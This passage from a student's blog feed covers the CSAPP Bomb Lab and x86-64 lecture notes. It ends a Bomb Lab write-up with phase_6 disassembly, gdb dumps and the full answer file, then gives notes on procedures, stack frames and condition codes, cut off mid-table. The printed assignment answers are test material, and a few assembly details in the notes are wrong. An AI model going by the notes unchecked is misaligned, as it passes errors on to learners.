   0x000000000040119d &amp;lt;+169&amp;gt;:   jle    0x401183 &amp;lt;phase_6+143&amp;gt;        # 如果一个整数是1,安排链表头指针
   0x000000000040119f &amp;lt;+171&amp;gt;:   mov    $0x1,%eax
   0x00000000004011a4 &amp;lt;+176&amp;gt;:   mov    $0x6032d0,%edx
   0x00000000004011a9 &amp;lt;+181&amp;gt;:   jmp    0x401176 &amp;lt;phase_6+130&amp;gt;        # 我算是看明白了,整数是多少,对应位置就是指向链表第几个元素的地址
   0x00000000004011ab &amp;lt;+183&amp;gt;:   mov    0x20(%rsp),%rbx              # %rbx = 链表[第1个整数]的地址
   0x00000000004011b0 &amp;lt;+188&amp;gt;:   lea    0x28(%rsp),%rax              # %rax= 链表[第二个整数]的地址的地址
   0x00000000004011b5 &amp;lt;+193&amp;gt;:   lea    0x50(%rsp),%rsi              # %rsi = 链表[最后一个整数]的地址的地址
   0x00000000004011ba &amp;lt;+198&amp;gt;:   mov    %rbx,%rcx                    # %rcx = 链表[第一个整数]的地址
   0x00000000004011bd &amp;lt;+201&amp;gt;:   mov    (%rax),%rdx                  # %rdx = 链表[第二个整数]的地址
   0x00000000004011c0 &amp;lt;+204&amp;gt;:   mov    %rdx,0x8(%rcx)               # 
   0x00000000004011c4 &amp;lt;+208&amp;gt;:   add    $0x8,%rax
   0x00000000004011c8 &amp;lt;+212&amp;gt;:   cmp    %rsi,%rax
   0x00000000004011cb &amp;lt;+215&amp;gt;:   je     0x4011d2 &amp;lt;phase_6+222&amp;gt;
   0x00000000004011cd &amp;lt;+217&amp;gt;:   mov    %rdx,%rcx
   0x00000000004011d0 &amp;lt;+220&amp;gt;:   jmp    0x4011bd &amp;lt;phase_6+201&amp;gt;      # 重新排列了这个链表
   0x00000000004011d2 &amp;lt;+222&amp;gt;:   movq   $0x0,0x8(%rdx)              # 尾指针设为0
   0x00000000004011da &amp;lt;+230&amp;gt;:   mov    $0x5,%ebp                   # 
   0x00000000004011df &amp;lt;+235&amp;gt;:   mov    0x8(%rbx),%rax              
   0x00000000004011e3 &amp;lt;+239&amp;gt;:   mov    (%rax),%eax
   0x00000000004011e5 &amp;lt;+241&amp;gt;:   cmp    %eax,(%rbx)                 # 链表[第1个整数]&amp;gt;=链表[第2个整数]
   0x00000000004011e7 &amp;lt;+243&amp;gt;:   jge    0x4011ee &amp;lt;phase_6+250&amp;gt;
   0x00000000004011e9 &amp;lt;+245&amp;gt;:   call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x00000000004011ee &amp;lt;+250&amp;gt;:   mov    0x8(%rbx),%rbx              # 
   0x00000000004011f2 &amp;lt;+254&amp;gt;:   sub    $0x1,%ebp
   0x00000000004011f5 &amp;lt;+257&amp;gt;:   jne    0x4011df &amp;lt;phase_6+235&amp;gt;      # 要求链表降序排列
   0x00000000004011f7 &amp;lt;+259&amp;gt;:   add    $0x50,%rsp
   0x00000000004011fb &amp;lt;+263&amp;gt;:   pop    %rbx
   0x00000000004011fc &amp;lt;+264&amp;gt;:   pop    %rbp
   0x00000000004011fd &amp;lt;+265&amp;gt;:   pop    %r12
   0x00000000004011ff &amp;lt;+267&amp;gt;:   pop    %r13
   0x0000000000401201 &amp;lt;+269&amp;gt;:   pop    %r14
   0x0000000000401203 &amp;lt;+271&amp;gt;:   ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这么啊,太BT了www
哇塞,这些代码虽然很长,但是拆分开来不是很难.逻辑是获取6个输入,要求大于0小于7并且互不相同.依次去内存中一个创建好的链表中寻找对应序列的元素存取在栈上对应的位置(例如第2个输入是3,那么在栈的第2个指针位置放链表第3个元素的指针,此时%rsp+i*8就是&amp;quot;指针的指针&amp;quot;,这里最绕).接着修改链表使其重新排列.最后要求新链表降序排列即可.
我们打印链表(指针部分)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /8x 0x6032d8
0x6032d8 &amp;lt;node1+8&amp;gt;:     0xe0    0x32    0x60    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x6032e8
0x6032e8 &amp;lt;node2+8&amp;gt;:     0xf0    0x32    0x60    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x6032f8
0x6032f8 &amp;lt;node3+8&amp;gt;:     0x00    0x33    0x60    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x603308
0x603308 &amp;lt;node4+8&amp;gt;:     0x10    0x33    0x60    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x603318
0x603318 &amp;lt;node5+8&amp;gt;:     0x20    0x33    0x60    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x603328
0x603328 &amp;lt;node6+8&amp;gt;:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;(数据部分)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /8x 0x6032d0
0x6032d0 &amp;lt;node1&amp;gt;:       0x4c    0x01    0x00    0x00    0x01    0x00    0x00    0x00
(gdb) x /8x 0x6032e0
0x6032e0 &amp;lt;node2&amp;gt;:       0xa8    0x00    0x00    0x00    0x02    0x00    0x00    0x00
(gdb) x /8x 0x6032f0
0x6032f0 &amp;lt;node3&amp;gt;:       0x9c    0x03    0x00    0x00    0x03    0x00    0x00    0x00
(gdb) x /8x 0x603300
0x603300 &amp;lt;node4&amp;gt;:       0xb3    0x02    0x00    0x00    0x04    0x00    0x00    0x00
(gdb) x /8x 0x603310
0x603310 &amp;lt;node5&amp;gt;:       0xdd    0x01    0x00    0x00    0x05    0x00    0x00    0x00
(gdb) x /8x 0x603320
0x603320 &amp;lt;node6&amp;gt;:       0xbb    0x01    0x00    0x00    0x06    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;列表如下:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;index&lt;/th&gt;
&lt;th&gt;number&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0x14c&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;0x0a8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;0x39c&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;0x2b3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;0x1dd&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;0x1bb&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;降序排列的顺序为3-&amp;gt;4-&amp;gt;5-&amp;gt;6-&amp;gt;1-&amp;gt;2.&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;差点忘了,代码中曾经用7减去输入的数,所以最后的答案就是 &lt;code&gt;4 3 2 1 6 5&lt;/code&gt; !&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;kim@MyDell:/mnt/e/Documents/C/CSAPP/bomb$ cat answer
Border relations with Canada have never been better.
1 2 4 8 16 32
3 256
0 0
IONEFG
4 3 2 1 6 5
kim@MyDell:/mnt/e/Documents/C/CSAPP/bomb$ ./bomb answer
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That&amp;#39;s number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
Congratulations! You&amp;#39;ve defused the bomb!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;拿下!&lt;/p&gt;
&lt;h1&gt;隐藏彩蛋&lt;/h1&gt;
&lt;p&gt;看到别人的解答发现原来bomb还有彩蛋,并没有在main函数中使用.对于我这样用gdb见招拆招的选手当然没有想到.只有把整个可执行文件反汇编才能看到,比如使用objdump重定向输出&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;objdump -d bomb &amp;gt;&amp;gt; bomb.s
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;感受&lt;/h1&gt;
&lt;h1&gt;参考资料/补充学习&lt;/h1&gt;
&lt;h2&gt;别人的解法&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/451623574&quot;&gt;手把手教你拆解 CSAPP 的 炸弹实验室 BombLab - 知乎&lt;/a&gt;
&lt;a href=&quot;https://blog.csdn.net/weixin_52259822/article/details/124219469&quot;&gt;CSAPP：BombLab 详细解析_csapp bomblab-CSDN博客&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;GDB调试&lt;/h2&gt;
&lt;p&gt;[^1]:&lt;a href=&quot;https://zhuanlan.zhihu.com/p/451623574&quot;&gt;手把手教你拆解 CSAPP 的 炸弹实验室 BombLab - 知乎&lt;/a&gt;&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Sat, 18 Jan 2025 16:00:00 GMT</pubDate></item><item><title>机器级编程III(过程)</title><link>https://tankimzeg.top/blog/csapp/machine-level-programming-iii/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/machine-level-programming-iii/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/machine-level-programming-iii/&quot;&gt;https://tankimzeg.top/blog/csapp/machine-level-programming-iii/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;过程的机制&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;传递控制
当P调用Q时,程序必须以某种方式跳入Q中,执行Q的代码,然后当Q执行到退出时,程序需要以某种方式回到P.
因此为了返回到正确的位置,我们需要记录返回位置的信息.&lt;/li&gt;
&lt;li&gt;传递参数
Q是一个函数,它能够接收参数并能在函数内部使用这个参数.
当P调用Q的时候,P给Q传递了一个具体值.
当Q返回值时,P也能够使用返回值.&lt;/li&gt;
&lt;li&gt;内存管理
过程执行时分配内存,返回时释放内存.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;栈的结构&lt;/h1&gt;
&lt;p&gt;栈不是单独的硬件,而是内存的某一部分.程序使用栈来管理过程调用与返回的状态.
当调用时,需要一些信息;当从调用中返回时,所有的信息可以被丢弃,符合栈的后进先出的规则.
在x86栈中,栈开始的地址实际上是一个非常高的地址,当栈增长时,通过减小栈指针%rsp来实现.%rsp的值是当前栈顶的地址,每次分配更多栈的空间时,都会递减该指针.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Stack&lt;/th&gt;
&lt;th&gt;Address&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Bottom&lt;/td&gt;
&lt;td&gt;high address&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;↓ stack growing down&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%rsp:Top&lt;/td&gt;
&lt;td&gt;low address&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;汇编当中有 &lt;code&gt;push&lt;/code&gt; 和 &lt;code&gt;pop&lt;/code&gt; 两个指令来对栈进行操作.&lt;/p&gt;
&lt;h2&gt;push入栈&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	pushq    src 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;操作数src入栈,此操作数可以来自寄存器,内存或立即数:
首先%rsp减小8,然后把操作数复制到%rsp指向的内存处.
不能把内存中的数据直接放入到栈中,所以src是一个寄存器或者立即数.&lt;/p&gt;
&lt;h2&gt;pop出栈&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	popq     dst
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首先把%rsp地址指向的内存的值保存到dst寄存器中,然后%rsp增加8.
dst只能是寄存器.&lt;/p&gt;
&lt;h1&gt;传递控制&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;注意call, ret并不是完成了调用函数的全部工作,只是控制部分
使用栈来支持call和ret指令&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;call&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	call    label
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;返回地址入栈&lt;/li&gt;
&lt;li&gt;跳转到label&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;返回地址&lt;/h2&gt;
&lt;p&gt;返回地址是call的下一条指令&lt;/p&gt;
&lt;h2&gt;ret&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;返回地址出栈&lt;/li&gt;
&lt;li&gt;跳转到返回地址&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;举例&lt;/h2&gt;
&lt;p&gt;对于&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;400540 &amp;lt;multstore&amp;gt;:
	...
	400544: callq    400550 &amp;lt;mult2&amp;gt;
	400549: mov      %rax, (%rbx)
	...

400550 &amp;lt;mult2&amp;gt;:
	400550: mov     %rdi, %rax
	...
	400557: ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首先当程序计数器%rip执行到0x400544的时候,%rsp减去8,0x400549入栈,%rip修改为调用的函数的地址;调用的函数返回后,0x400549出栈,%rsp增加8,%rip修改为0x400549,也就是执行call的下一条指令.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250121180538.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250121180559.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250121180618.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250121180635.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不像 &lt;code&gt;push&lt;/code&gt; 和 &lt;code&gt;pop&lt;/code&gt;指令能够用mov实现,由于没有指令能够之间操作%rip,所以 &lt;code&gt;call&lt;/code&gt; 和 &lt;code&gt;ret&lt;/code&gt; 不能用其他指令实现.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;传递参数&lt;/h1&gt;
&lt;p&gt;头6个参数(如果有)依次存放在这6个寄存器中:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;寄存器&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;第1个&lt;/td&gt;
&lt;td&gt;%rdi&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;第2个&lt;/td&gt;
&lt;td&gt;%rsi&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;第3个&lt;/td&gt;
&lt;td&gt;%rdx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;第4个&lt;/td&gt;
&lt;td&gt;%rcx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;第5个&lt;/td&gt;
&lt;td&gt;%r8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;第6个&lt;/td&gt;
&lt;td&gt;%r9&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;如果参数的个数多于6个,剩下的参数会存放在栈上.&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;函数返回值为%rax&lt;/p&gt;
&lt;h1&gt;管理局部数据&lt;/h1&gt;
&lt;h2&gt;面向堆栈的语言&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;支持递归的语言:例如C,Java等等大多数语言&lt;ul&gt;
&lt;li&gt;&amp;quot;可重入&amp;quot;的函数:在任何给定的时间只有一个函数在运行&lt;/li&gt;
&lt;li&gt;需要一些空间来存储每个实例的状态:参数,局部变量,返回指针
我们把栈上用于特定调用的每个内存块称为&lt;strong&gt;栈帧&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;栈帧&lt;/h2&gt;
&lt;p&gt;在栈上为每个被调用且未返回的过程保留一个栈帧.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250121215045.png&quot; alt=&quot;&quot;&gt;
通常一个栈帧由两个指针分割,一个是栈顶指针%rsp,另一个是基底指针&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;栈帧的内容&lt;ul&gt;
&lt;li&gt;返回信息&lt;/li&gt;
&lt;li&gt;局部存储&lt;/li&gt;
&lt;li&gt;临时空间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250121221021.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;调用者的栈帧
如果需要传递6个以上的参数,调用者实际上将使用自己的栈帧来存储这些参数
返回地址入栈&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;当前栈帧
如果使用%rbp,还需要存储之前的%rbp
参数,局部变量...&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;举例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* incr */
long incr(long *p,long val){
	long x = *p;
	long y = x + val;
	*p = y;
	return x;
}// 以val增加p指向的整数
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;incr的汇编代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;incr:
	movq    (%rdi), %rax
	addq    %rax, %rsi
	movq    %rsi, (%rdi)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* call_incr */
long call_incr(){
	long v1 = 12345;
	long v2 = incr(&amp;amp;v1, 1)
	return v1 + v2;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;call_incr的汇编代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;call_incr:
	subq    $16, %rsp
	movq    $12345, 8(%rsp)
	movl    $1, %esi           # 第二个参数1
	leaq    8(%rsp), %rdi      # 第一个参数*8(%rsp)
	call    incr
	addq    8(%rsp), %rax
	addq    $16, %rsp
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;栈的内容&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;...&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;...&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ret address&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;12345          ←%rsp+8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;unuse          ←%rsp&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;编译器分配栈帧空间时会预留一些不一定会使用的空间&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;寄存器保存约定&lt;/h2&gt;
&lt;p&gt;寄存器的数量是有限的,不同函数对寄存器重复进行操作可能会导致冲突,所以有些寄存器的值不得不先保存到内存当中,并遵循一定规则约定.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;调用者保存(caller saved)
调用者在调用前把临时数据保存在它的栈帧中.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250122003159.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;被调用者保存(callee saved)
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250122003225.png&quot; alt=&quot;&quot;&gt;
被调用者在使用寄存器前把寄存器的数据保存在它的栈帧中.返回时重新存取.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;阐述递归&lt;/h1&gt;
&lt;p&gt;使用递归计数unsigned int 的1位的个数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Recursive popcount */
long pcount_r(unsigned long x){
	if(x==0)
		return 0;
	else 
		return (x &amp;amp; 1) + pcount_r(x&amp;gt;&amp;gt;1);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;汇编代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;pcount_r:
	movl    $0, %eax
	testq   %rdi, %rdi
	je      .L6
	pushq   %rbx
	movq    %rdi, %rbx       # x先存储到%rbx
	andl    $1, %eax      
	shrq    %rdi             # x&amp;gt;&amp;gt;=1,传给递归函数
	call    pcount_r
	addq    %rbx, %rax       # %rax是递归返回结果
	popq    %rbx             # x恢复到之前的值
.L6:
	rep; ret
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Sat, 18 Jan 2025 16:00:00 GMT</pubDate></item><item><title>机器级编程II(控制)</title><link>https://tankimzeg.top/blog/csapp/machine-level-programming-ii/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/machine-level-programming-ii/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/machine-level-programming-ii/&quot;&gt;https://tankimzeg.top/blog/csapp/machine-level-programming-ii/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;处理器状态(部分)&lt;/h1&gt;
&lt;p&gt;当前执行程序的信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;临时数据:%rax,%rbx...&lt;/li&gt;
&lt;li&gt;当前栈顶:%rsp&lt;/li&gt;
&lt;li&gt;指令指针:%rip当前正在执行的指令的地址&lt;/li&gt;
&lt;li&gt;条件码(共8个)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;条件码&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;1bit的寄存器&lt;ul&gt;
&lt;li&gt;CF(Carry Flag):进位标志(for unsigned)&lt;/li&gt;
&lt;li&gt;ZF(Zero Flag):零标志,运算的结果是0就会被设置&lt;/li&gt;
&lt;li&gt;SF(Sign Flag):符号标志(for signed),如果运算的结果最高位是1(说明结果是负数)就会被设置为1&lt;/li&gt;
&lt;li&gt;OF(Overflow Flag):溢出标志(for signed),如运算结果溢出就会被设置为1&lt;/li&gt;
&lt;li&gt;lea指令不会设置这些条件码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;隐式设置&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;addq src,dst&lt;/code&gt; &amp;lt;-&amp;gt; &lt;code&gt;t = a + b;&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当unsigned溢出时设置CF&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;t == 0&lt;/code&gt;时设置ZF&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;t &amp;lt; 0&lt;/code&gt;时设置SF&lt;/li&gt;
&lt;li&gt;当signed溢出时设置OF    &lt;code&gt;(a&amp;gt;0 &amp;amp;&amp;amp; b&amp;gt;0 &amp;amp;&amp;amp; t&amp;lt;0) || (a&amp;lt;0 &amp;amp;&amp;amp; b&amp;lt;0 &amp;amp;&amp;amp; t&amp;gt;=0)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;显式设置&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;cmpq b, a&lt;/code&gt;:计算a-b&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;当unsigned溢出时设置CF&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;a == b&lt;/code&gt;时设置ZF&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;(a-b) &amp;lt; 0&lt;/code&gt;时设置SF&lt;/li&gt;
&lt;li&gt;当signed溢出时设置OF     &lt;code&gt;(a&amp;gt;0 &amp;amp;&amp;amp; b&amp;lt;0 &amp;amp;&amp;amp; (a-b)&amp;lt;0) || (a&amp;lt;0 &amp;amp;&amp;amp; b&amp;gt;0 &amp;amp;&amp;amp; (a-b)&amp;gt;0)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;code&gt;test b, a&lt;/code&gt; : 计算a&amp;amp;b&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;当&lt;code&gt;a &amp;amp; b == 0&lt;/code&gt;时设置ZF&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;a &amp;amp; b &amp;lt; 0&lt;/code&gt;时设置SF
有一个操作数是掩码的时候就可以直接得出另一个操作数是整数还是负数.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;读取条件码&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;set* dst&lt;/code&gt;指令:基于条件码,设置dst的最低一位为0或1&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;left&quot;&gt;set*&lt;/th&gt;
&lt;th align=&quot;left&quot;&gt;条件&lt;/th&gt;
&lt;th align=&quot;left&quot;&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;sete&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;ZF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;equal/zero&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setne&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;~ZF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;not equal/not zero&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;sets&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;SF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;negative&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setns&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;~SF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;nonnegative&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setg&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;del&gt;(SF^OF)&amp;amp;&lt;/del&gt;ZF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;greater(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setge&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;~(SF^OF)&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;greater or equal(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setl&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;(SF^OF)&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;less(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setle&lt;/code&gt;&lt;/td&gt;
